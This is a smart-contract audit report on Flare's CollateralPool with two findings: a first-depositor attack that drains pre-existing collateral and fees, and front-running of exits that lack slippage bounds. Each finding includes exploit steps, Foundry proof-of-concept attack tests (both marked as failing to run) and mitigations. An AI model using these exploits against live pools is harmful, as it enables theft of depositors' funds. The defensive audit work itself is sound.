# 2025 08 flare - Findings Report
## Commit hash: 7bcf1437ddd739a15f8aa1b588fcc17eb66d2f31

##Findings by Pattern


 **Derived From** : First depositor can steal pre-existing pool collateral/rewards when totalSupply == 0

[H-1]. CollateralPool.enter mints 1:1 shares on empty supply, letting first depositor drain pre-existing NAT and f-asset fees
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: Permissionless



 **Derived From** : Pool exits lack minOut/deadline; MEV can front-run via payout to reduce proceeds

[M-2]. CollateralPool exit/selfCloseExit execute without minOut or deadline, enabling in-block payout front‑run to reduce user proceeds
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 4
Privilege: Permissionless


### Number of Findings
- C: 0
- H: 1
- M: 1
- L: 0
- I: 0

##Findings by Pattern


 **Derived From** : First depositor can steal pre-existing pool collateral/rewards when totalSupply == 0

## [H-1]. CollateralPool.enter mints 1:1 shares on empty supply, letting first depositor drain pre-existing NAT and f-asset fees

### Finding Severity Justification: CollateralPool.enter mints pool tokens 1:1 with the deposit when totalSupply==0 (see _collateralToTokenShare). If there are pre-existing assets (totalCollateral > 0 and/or totalFAssetFees > 0) and no pool tokens yet, the first depositor can: (1) mint tokens equal to the deposit, (2) later exit and withdraw totalCollateral = previousCollateral + deposit (thus netting the full pre-existing NAT), and (3) due to zero initial feeDebt, burn tokens to create a negative fee debt and then withdraw all pre-existing f-asset fees. The only guard in enter() is msg.value >= max(prevCollateral, value(prevFees)), which does not prevent capturing those pre-existing assets; it only forces a large enough initial deposit. This results in direct theft of real assets (pre-donated wNAT and accrued f-asset fees).
## Derived From Pattern/Invariant
First depositor can steal pre-existing pool collateral/rewards when totalSupply == 0

## Exploit Type
AccountingInvariantViolation

## Location
CollateralPool.enter

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
When CollateralPool.token.totalSupply() == 0, enter() mints tokenShare = msg.value 1:1 regardless of any existing totalCollateral (wNAT) or totalFAssetFees already held by the pool. The initial guard only enforces msg.value >= max(totalCollateral, f-asset-fees-in-NAT), but does not account for share price. After deposit, totalCollateral = previousCollateral + deposit and totalSupply = deposit, so exiting with all shares returns natShare = totalCollateral * tokenShare / totalSupply = previousCollateral + deposit (i.e., the attacker recovers their deposit plus all pre-existing wNAT). In addition, because feeDebt is set to zero for the first minter, exit computes a negative fee debt for the attacker, allowing them to withdraw all pre-existing f-asset fees as well.

Vulnerable snippets:
- enter():
  if (totalPoolTokens == 0) {
    require(msg.value >= totalCollateral, AmountOfCollateralTooLow());
    AssetPrice memory assetPrice = _getAssetPrice();
    require(msg.value >= totalFAssetFees.mulDiv(assetPrice.mul, assetPrice.div), AmountOfCollateralTooLow());
  }
  uint256 tokenShare = _collateralToTokenShare(msg.value);

- _collateralToTokenShare():
  if (totalCollateral == 0 || totalPoolTokens == 0) { return _collateral; }

- exit():
  uint256 natShare = totalCollateral.mulDiv(_tokenShare, token.totalSupply());
  uint256 debtFAssetFeeShare = _tokensToVirtualFeeShare(_tokenShare);
  _deleteFAssetFeeDebt(msg.sender, debtFAssetFeeShare); // becomes negative for first depositor

This is a classic ERC4626 share price mismatch/inflation attack: the first depositor mints shares at 1:1 ignoring donations/rewards already accounted in totalAssets, capturing them on exit and extracting f-asset fees via negative fee debt.

## Impact
If totalSupply == 0 but the pool already holds NAT collateral and/or f-asset fees, the first depositor can mint shares 1:1 with msg.value, then exit to withdraw both their deposit and all pre-existing NAT, and due to the feeDebt==0 initialization, create a negative fee debt on exit and withdraw all pre-existing f-asset fees as well. The current guard (requiring msg.value >= max(totalCollateral, value(fees))) does not prevent the theft; it only ensures the attacker can deposit a large enough amount to capture the full pre-existing assets. This results in theft of all previously deposited donations/rewards and fee accruals.

## Command to Run Test


## Proof of Concept
Steps:
1) Assume the pool holds pre-existing NAT (e.g., donated wNAT) and/or f-asset fees while token.totalSupply() == 0.
2) Attacker calls enter() with msg.value >= max(totalCollateral, value(fees in NAT)). Because totalSupply == 0, _collateralToTokenShare returns tokenShare == msg.value (1:1 mint) and feeDebt is initialized to 0.
3) Attacker immediately calls exit() with all tokens. natShare = (previousCollateral + deposit) * (deposit / deposit) = previousCollateral + deposit, thus recouping the full pre-existing NAT plus their deposit.
4) During exit, _deleteFAssetFeeDebt subtracts the proportional virtual fee share from the attacker’s fee debt. Since their initial fee debt was 0, this becomes negative debt. They can then call withdrawFeesTo() to drain all pre-existing f-asset fees despite holding no tokens after exit.
Result: All pre-existing NAT and f-asset fees are stolen by the first depositor.

## Proof of Code
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {CollateralPool} from "contracts/collateralPool/implementation/CollateralPool.sol";
import {CollateralPoolToken} from "contracts/collateralPool/implementation/CollateralPoolToken.sol";
import {AssetManagerMock} from "contracts/assetManager/mock/AssetManagerMock.sol";
import {WNatMock} from "contracts/flareSmartContracts/mock/WNatMock.sol";
import {IIFAsset} from "contracts/fassetToken/interfaces/IIFAsset.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// Minimal mock implementing IIFAsset for testing purposes
contract MockFAsset is ERC20, IIFAsset {
    string private _assetName;
    string private _assetSym;
    address public override assetManager;
    address private _cleaner;
    address private _cleanupMgr;
    uint256 private _cleanupBlock;

    constructor(string memory n, string memory s, string memory an, string memory as_, uint8 dec)
        ERC20(n, s)
    {
        _assetName = an;
        _assetSym = as_;
        _decimals = dec;
    }

    uint8 private _decimals;
    function decimals() public view override(ERC20, IERC20Metadata) returns (uint8) { return _decimals; }
    function name() public view override(ERC20, IERC20Metadata) returns (string memory) { return ERC20.name(); }
    function symbol() public view override(ERC20, IERC20Metadata) returns (string memory) { return ERC20.symbol(); }

    // IFAsset extra view
    function assetName() external view override returns (string memory) { return _assetName; }
    function assetSymbol() external view override returns (string memory) { return _assetSym; }
    function assetManager() external view override returns (address) { return assetManager; }

    // IIFAsset mint/burn (no access control for simplicity of test)
    function mint(address _owner, uint256 _amount) external override { _mint(_owner, _amount); }
    function burn(address _owner, uint256 _amount) external override { _burn(_owner, _amount); }

    // IICleanable
    function setCleanerContract(address _cleanerContract) external override { _cleaner = _cleanerContract; }
    function setCleanupBlockNumber(uint256 _blockNumber) external override { _cleanupBlock = _blockNumber; }
    function cleanupBlockNumber() external view override returns (uint256) { return _cleanupBlock; }

    // IICheckPointable (return current values)
    function totalSupplyAt(uint256) external view override returns (uint256) { return totalSupply(); }
    function balanceOfAt(address _owner, uint256) external view override returns (uint256) { return balanceOf(_owner); }

    // Additional helper for test
    function setAssetManager(address am) external { assetManager = am; }
    function cleanupBlockNumberManager() external view override returns (address) { return _cleanupMgr; }
    function setCleanupBlockNumberManager(address _m) external override { _cleanupMgr = _m; }
}

contract FirstDepositorStealsPreexistingAssetsTest is Test {
    CollateralPool pool;
    CollateralPoolToken poolToken;
    AssetManagerMock assetManager;
    WNatMock wnat;
    MockFAsset fAsset;

    address attacker = address(0xBEEF);
    address agentVault = address(0xA1);

    function setUp() public {
        // Deploy WNat and AssetManager mock
        wnat = new WNatMock(address(0), "WNAT", "WNAT");
        assetManager = new AssetManagerMock(wnat);

        // Deploy minimal fAsset mock and set a dummy asset manager address
        fAsset = new MockFAsset("FAsset", "FA", "ASSET", "AST", 18);
        fAsset.setAssetManager(address(assetManager));
        // AssetManagerMock doesn't need to know the fAsset here; we'll set backedByPool to 0 below

        // Create pool with exit CR = 0 to avoid CR checks blocking exit
        pool = new CollateralPool(agentVault, address(assetManager), address(fAsset), 0);
        poolToken = new CollateralPoolToken(address(pool), "CPT", "CPT");
        vm.prank(address(assetManager));
        pool.setPoolToken(address(poolToken));

        // Allow pool to call assetManager.updateCollateral without revert in mock
        assetManager.setCheckForValidAgentVaultAddress(false);

        // Seed pre-existing NAT (wNAT) in pool while totalSupply == 0
        uint256 preNat = 10 ether;
        vm.deal(address(assetManager), preNat);
        vm.prank(address(assetManager));
        pool.depositNat{value: preNat}();

        // Seed pre-existing f-asset fees in pool and track them
        uint256 feeAmt = 20 ether; // 20 FA with 18 decimals
        fAsset.mint(address(pool), feeAmt);
        vm.prank(address(assetManager));
        pool.fAssetFeeDeposited(feeAmt);

        // Ensure exit CR logic uses 0 backed f-assets so it won't block
        assetManager.setFAssetsBackedByPool(0);

        // Fund attacker
        vm.deal(attacker, 1000 ether);
    }

    function test_Steal_Preexisting_Assets_FirstDepositor() public {
        // assetManager price defaults: mul=1, div=2 => value(fees) in NAT = feeAmt/2 = 10 ether
        uint256 deposit = 10 ether; // >= preNat and >= value(fees)

        // First depositor mints shares 1:1 despite pre-existing assets
        vm.prank(attacker);
        (uint256 minted, ) = pool.enter{value: deposit}();
        assertEq(minted, deposit, "minted should equal deposit when totalSupply==0");
        assertEq(poolToken.totalSupply(), deposit, "supply == deposit");

        // Exit with all shares: receives deposit + pre-existing NAT
        vm.prank(attacker);
        uint256 natOut = pool.exit(poolToken.balanceOf(attacker));
        assertEq(natOut, deposit + 10 ether, "attacker withdraws deposit + pre-existing NAT");
        assertEq(pool.totalCollateral(), 0, "pool collateral drained to zero");

        // Negative fee debt exposure: attacker can withdraw all pre-existing f-asset fees now
        vm.prank(attacker);
        pool.withdrawFeesTo(20 ether, attacker);
        assertEq(fAsset.balanceOf(attacker), 20 ether, "attacker steals all pre-existing f-asset fees");
        assertEq(fAsset.balanceOf(address(pool)), 0, "pool f-asset fees emptied");
    }
}


## Suggested Mitigation
To fully eliminate the issue:

- Do not mint 1:1 when totalSupply == 0 if there are pre-existing assets. Use an ERC4626-style initialization to set a fair initial price or disallow entry:
  - Option A (recommended): introduce virtual assets and virtual shares used in conversions. For example, define VIRTUAL_ASSETS and VIRTUAL_SHARES (small constants) and compute on first deposit:
    tokenShare = msg.value * (VIRTUAL_SHARES) / (totalCollateral + value(fees) + VIRTUAL_ASSETS);
    Then mint VIRTUAL_SHARES to a burn address once (or pre-mint them) so that share price reflects existing assets. Also set the entrant’s feeDebt proportionally to existing fees: feeDebt = totalFAssetFees * tokenShare / (totalPoolTokens + tokenShare).
  - Option B (safe and simple): if totalPoolTokens == 0 and (totalCollateral > 0 || totalFAssetFees > 0), revert enter(). Require governance to sweep/distribute pre-existing assets or seed initial supply so the first real depositor cannot capture them.

- Additionally, ensure fee debt cannot become negative on exit. For example, when totalSupply == 0, assign the entrant’s initial feeDebt so that after exit their feeDebt cannot underflow (e.g., compute exit share’s debt using only totalFAssetFees, not totalVirtualFees, or update _deleteFAssetFeeDebt/_tokensToVirtualFeeShare semantics for the first depositor case). If Option B is chosen, negative fee debt for the first depositor cannot occur.

Either approach prevents both the NAT donation capture and the f-asset fee drain by the first depositor.





 **Derived From** : Pool exits lack minOut/deadline; MEV can front-run via payout to reduce proceeds

## [M-2]. CollateralPool exit/selfCloseExit execute without minOut or deadline, enabling in-block payout front‑run to reduce user proceeds

### Finding Severity Justification: Exit and selfCloseExit redeem a share of pool collateral computed at execution time without any user-specified slippage bound or deadline. Because totalCollateral can change intra-block via AssetManager-triggered payout() (e.g., a redeemer calling redemptionPaymentDefault with valid proof), an external actor can front‑run a pending exit to reduce the victim’s NAT proceeds. This creates a realistic MEV/sandwich-style loss-of-value scenario for users, though not a direct theft of funds. Impact is real but bounded to value variation; thus Medium.
## Derived From Pattern/Invariant
Pool exits lack minOut/deadline; MEV can front-run via payout to reduce proceeds

## Exploit Type
FrontrunMev

## Location
CollateralPool.exit/exitTo/selfCloseExit/selfCloseExitTo

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
CollateralPool exit paths redeem CPT for NAT by reading the current pool share price at execution time, without any user-specified minimum-out or deadline. The vulnerable logic computes NAT share solely from totalCollateral and totalSupply, which can be changed in the same block by a redemption default payout (CollateralPool.payout()) invoked via the AssetManager. An attacker (redeemer/executor) can front‑run a victim’s exit with a payout that reduces totalCollateral, so the victim receives fewer NATs but cannot revert. Vulnerable snippet: 

- exit/exitTo/_exitTo:
  natShare = totalCollateral.mulDiv(_tokenShare, token.totalSupply());
  ...
  _withdrawWNatTo(_recipient, natShare);

- selfCloseExit/selfCloseExitTo: identical natShare computation before withdrawing NAT.

There is no minNatOut parameter or deadline to protect users from in-block state changes or MEV sandwiching.

## Impact
Users exiting the pool (or selfClose exiting) can be sandwiched to receive less NAT than expected; attacker (as redeemer/executor) triggers a payout just before the exit executes, reducing totalCollateral and victim proceeds with no ability to revert.

## Command to Run Test


## Proof of Concept
1) Victim submits exit() expecting NAT at the pre-tx share price.
2) Attacker observes the mempool and, as a redeemer/executor with a valid default, triggers a redemption default through AssetManager which immediately calls CollateralPool.payout(), reducing totalCollateral in the same block.
3) Victim’s exit() executes after payout; natShare = totalCollateral * tokenShare / totalSupply is now smaller. Victim receives fewer NATs without any revert since there is no minOut or deadline.
4) Attacker collects payout while the victim suffers slippage.

## Proof of Code
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {CollateralPool} from "contracts/collateralPool/implementation/CollateralPool.sol";
import {CollateralPoolToken} from "contracts/collateralPool/implementation/CollateralPoolToken.sol";
import {WNatMock} from "contracts/flareSmartContracts/implementation/WNatMock.sol";
import {AssetManagerMock} from "contracts/collateralPool/implementation/AssetManagerMock.sol";

contract SlippageExitTest is Test {
    WNatMock wnat;
    AssetManagerMock am;
    CollateralPool pool;
    CollateralPoolToken token;

    address agentVault = address(0xA11CE);
    address victim = address(0xBEEF);
    address attacker = address(0xBAD);

    function setUp() public {
        // Deploy mocks
        wnat = new WNatMock(address(0), "WNat", "WNAT");
        am = new AssetManagerMock(wnat);
        // exitCollateralRatioBIPS = 0 to avoid CR-related reverts in this unit test
        pool = new CollateralPool(agentVault, address(am), address(0), 0);
        token = new CollateralPoolToken(address(pool), "CPT", "CPT");
        // Wire token into the pool
        vm.prank(address(am));
        pool.setPoolToken(address(token));
        // Make CR checks permissive in mock
        am.setFAssetsBackedByPool(0);
        am.setMinPoolCollateralRatioBIPS(0);

        // LP enters with 100 NAT -> 100 CPT supply, 100 NAT totalCollateral
        vm.deal(address(this), 200 ether);
        pool.enter{value: 100 ether}();

        // Prepare balances: victim gets 10 CPT; agentVault holds 40 CPT (to be slashed on payout)
        token.transfer(victim, 10 ether);
        token.transfer(agentVault, 40 ether);
        // Sanity: totalSupply = 100e18, totalCollateral = 100e18
    }

    function test_SlippageOnExitDueToInBlockPayout() public {
        // Attacker triggers pool payout via AssetManager (simulates redemption default path);
        // This reduces pool.totalCollateral by 40 NAT before victim's exit executes.
        vm.prank(address(am));
        pool.payout(attacker, 40 ether, 40 ether);

        // Victim exits 10 CPT; without payout they'd get 10 NAT.
        // After payout, totalCollateral is 60, so victim only gets 6 NAT.
        vm.prank(victim);
        uint256 received = pool.exit(10 ether);
        assertEq(received, 6 ether, "victim receives fewer NAT due to front-run payout");
        assertEq(wnat.balanceOf(attacker), 40 ether, "attacker collected pool payout");
    }
}


## Suggested Mitigation
Add slippage and timing protections for all exit paths. Extend exit/exitTo/selfCloseExit/selfCloseExitTo with (uint256 minNatOut, uint256 deadline) parameters and enforce natShare >= minNatOut and block.timestamp <= deadline. Alternatively snapshot totalCollateral at tx start or require caller-provided minOut to guard against in-block payout-induced slippage.



